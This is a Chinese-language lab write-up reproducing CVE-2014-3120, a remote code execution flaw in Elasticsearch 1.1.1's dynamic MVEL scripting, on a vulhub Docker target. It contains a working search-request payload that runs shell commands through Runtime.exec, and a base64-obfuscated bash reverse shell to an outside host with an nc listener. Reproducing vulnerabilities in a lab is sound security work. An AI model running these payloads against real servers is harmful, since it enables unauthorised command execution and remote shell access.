Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful
web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。

ElasticSearch有脚本运行的功能，能够非常方便地对查询出来的数据再加工处理。
ElasticSearch用的脚本引擎是MVEL，这个引擎没有做什么的防护，所以直接能够运行随意代码。
而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户能够直接通过http请求，运行随意代码。

ElasticSearch版本： v1.1.1

本文仅作漏洞复现记录与实现，利用流程如下:

一、漏洞环境搭建

本文漏洞环境采用vulhub搭建，执行以下命令开启环境

cd /elasticsearch/CVE-2014-3120

docker-compose build

docker-compose up -d

执行完毕后访问9200端口，显示如下

![1617614711_606ad7777a50c677dd7f7.png!small](https://image.3001.net/images/20210405/1617614711_606ad7777a50c677dd7f7.png!small)

漏洞链接: http://192.168.101.152:9200/

二、漏洞利用过程

利用该漏洞首先需要ElasticSearch存在至少一条数据，发送以下数据包添加数据

POST /website/blog/ HTTP/1.1  
Host: 192.168.91.130:9200  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Content-Length: 27

{  
"name": "colleget"  
}

![1617614843_606ad7fb5044c5478e33e.png!small](https://image.3001.net/images/20210405/1617614843_606ad7fb5044c5478e33e.png!small)

返回201状态码代表添加成功，之后发送以下数据包，执行命令

POST /_search?pretty HTTP/1.1  
Host: 192.168.91.130:9200  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 366

{  
"size": 1,  
"query": {  
"filtered": {  
"query": {  
"match_all": {  
}  
}  
}  
},  
"script_fields": {  
"command": {  
"script": "import java.io.*;new
java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\\\\A\").next();"  
}  
}  
}  
}  
}

![1617614914_606ad842f4216dc6f0e59.png!small](https://image.3001.net/images/20210405/1617614914_606ad842f4216dc6f0e59.png!small)

可以看到执行结果回显，接下来是反弹shell，为了方便写了个脚本

先在dnslog上获取域名，执行命令后判断目标可出网

![1617615543_606adab71232d0777b871.png!small](https://image.3001.net/images/20210405/1617615543_606adab71232d0777b871.png!small)

![1617615036_606ad8bc72e5fa3aff1ff.png!small](https://image.3001.net/images/20210405/1617615036_606ad8bc72e5fa3aff1ff.png!small)

之后在服务器上执行nc -lvvp 1234，监听端口，再执行命令

bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}

![1617615487_606ada7febbd506a5e8f0.png!small](https://image.3001.net/images/20210405/1617615487_606ada7febbd506a5e8f0.png!small)

稍等一会儿就可以看到shell反弹到服务器上了

![1617615340_606ad9ec3ca3ada529e49.png!small](https://image.3001.net/images/20210405/1617615340_606ad9ec3ca3ada529e49.png!small)

结束

